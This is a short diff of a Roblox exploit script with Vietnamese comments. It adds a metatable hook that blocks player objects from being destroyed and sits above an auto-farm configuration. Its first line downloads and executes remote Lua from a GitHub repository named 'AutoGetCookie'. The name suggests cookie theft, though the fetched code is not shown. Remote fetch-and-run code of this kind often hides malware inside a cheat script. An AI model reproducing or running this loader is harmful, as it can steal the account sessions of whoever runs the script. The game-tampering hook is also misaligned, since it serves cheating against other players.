@@ -2,6 +2,21 @@ spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
 end)
 wait(5)
+local Players = game:GetService("Players")
+
+-- Lấy metatable của Player instance
+local mt = getrawmetatable(game:GetService("Players"):GetPlayers()[1] or Players.LocalPlayer)
+local oldNamecall = mt.__namecall
+
+setreadonly(mt, false)
+mt.__namecall = function(self, ...)
+    if getnamecallmethod() == "Destroy" and self.Parent == Players then
+        print(123)
+		return -- chặn xoá player trong game.Players
+    end
+    return oldNamecall(self, ...)
+end
+setreadonly(mt, true)
 getgenv().ConfigsKaitun = {
 	["Block Pet Gift"] = true,
 
